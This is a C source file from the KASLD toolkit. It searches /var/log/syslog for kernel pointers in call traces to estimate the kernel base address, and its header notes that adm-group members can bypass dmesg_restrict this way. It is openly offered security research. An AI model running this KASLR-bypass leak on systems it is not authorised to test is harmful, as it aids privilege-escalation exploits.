// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search system log files for call traces and return the lowest
// address that looks like a kernel pointer.
//
// On Ubuntu systems, `kernel.dmesg_restrict` can be bypassed by
// users in the `adm` group, due to file read permissions on log
// files in `/var/log/`.
//
// $ ls -la /var/log/syslog /var/log/kern.log
// -rw-r----- 1 syslog adm 1916625 Dec 31 04:24 /var/log/kern.log
// -rw-r----- 1 syslog adm 1115029 Dec 31 04:24 /var/log/syslog
//
// Requires:
// - read permissions for /var/log/syslog*
// - kernel.panic_on_oops = 0 (Default on most systems).
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long search_syslog_file_kernel_pointers() {
  FILE *f;
  char *ptr;
  char *endptr;
  char *line_buf;
  char *line = 0;
  size_t size = 0;
  // We could also try /var/log/syslog.1 and /var/log/syslog.*.gz
  // but older log files will include log entries from previous boots.
  const char *path = "/var/log/syslog";
  unsigned long leaked_addr = 0;
  unsigned long addr = 0;

  printf("[.] searching %s for call trace kernel pointers ...\n", path);

  f = fopen(path, "rb");

  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  while ((getline(&line, &size, f)) != -1) {
    ptr = strtok(&line[0], "[<");
    while ((ptr = strtok(NULL, "[<")) != NULL) {
      leaked_addr = strtoul(&ptr[0], &endptr, 16);

      if (!leaked_addr)
        continue;

      if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
        // printf("Found kernel pointer: %lx\n", leaked_addr);
        if (!addr || leaked_addr < addr)
          addr = leaked_addr;
      }
    }
  }

  fclose(f);

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = search_syslog_file_kernel_pointers();
  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & ~KERNEL_BASE_MASK);

  return 0;
}
